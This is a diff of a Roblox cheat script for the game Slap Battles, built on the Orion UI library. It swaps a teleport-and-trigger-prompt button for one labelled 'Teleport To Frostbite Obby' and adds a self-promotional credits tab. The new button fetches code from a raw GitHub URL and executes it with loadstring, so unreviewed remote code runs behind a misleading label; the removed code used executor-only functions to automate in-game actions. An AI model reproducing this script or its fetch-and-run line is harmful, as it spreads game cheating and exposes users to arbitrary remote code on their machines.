@@ -5,7 +5,7 @@ local Window = OrionLib:MakeWindow({
     HidePremium = false,
     SaveConfig = false,
     ConfigFolder = "Orion",
-    IntroText = "Frostbite Abuser | Repository",
+    IntroText = "Frostbite Abuse | Repository Hub",
     Draggable = true
 })
 
@@ -115,27 +115,11 @@ local O1Section = OTab:AddSection({
 
 OTab:AddParagraph("OTHER", "This tab is used for getting the badges required for this script, or overall modifying the player's speed, or maybe antis")
 
--- Fixed missing `end` statements and unclosed brackets in the Get Glove FrostBite button
 OTab:AddButton({
-    Name = "Get Glove FrostBite",
-    Callback = function()
-        local teleportFunc = queueonteleport or queue_on_teleport
-        if teleportFunc then
-            teleportFunc([[
-                if not game:IsLoaded() then
-                    game.Loaded:Wait()
-                end
-                repeat wait() until game.Players.LocalPlayer
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-554, 177, 56)
-                wait(0.7)
-                for i, v in ipairs(game:GetService("Workspace"):GetDescendants()) do
-                    if v.ClassName == "ProximityPrompt" then
-                        fireproximityprompt(v)
-                    end
-                end
-            ]])
-        end
-    end    
+	Name = "Teleport To Frostbite Obby",
+	Callback = function()
+      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/LoserGrape/sekekekke/main/sakball')))()
+  	end    
 })
 
 OTab:AddParagraph("Sliders", "This is overall used to set your speed or jump-power, and tbh idk why you need this lol")
@@ -230,3 +214,33 @@ OTab:AddToggle({
 })
 
 OTab:AddParagraph("Notice", "I was a little lazy on the anti-section but wasn't lazy on the normal stuff :3")
+
+local CTab = Window:MakeTab({
+	Name = "Credit Owner",
+	Icon = "rbxassetid://7734053426",
+	PremiumOnly = false
+})
+
+local C1Section = CTab:AddSection({
+	Name = "Credit Owner Tab - Repository Hub"
+})
+
+CTab:AddParagraph("My YouTube Channel","my youtube channel is @slapbattlesrepository so go subscribe! or if your lazy theres a button under this paragraph that copys my youtube url link")
+
+CTab:AddButton({
+	Name = "Copy My Youtube Link",
+	Callback = function()
+      		setclipboard("https://www.youtube.com/@SlapBattlesRepository")
+  	end    
+})
+
+CTab:AddParagraph("My Accounts","my official youtube account is linked within this script, my scriptblox account is the one who first posted this, @whaleroblox :3 anyways you should really pay respects cuz i did this solo")
+
+CTab:AddButton({
+	Name = "Pay Your Respect",
+	Callback = function()
+      		setclipboard("respect payed + :3")
+  	end    
+})
+
+CTab:AddParagraph("End of script","so yeah this is the end of the script so go shoo shoo haah")
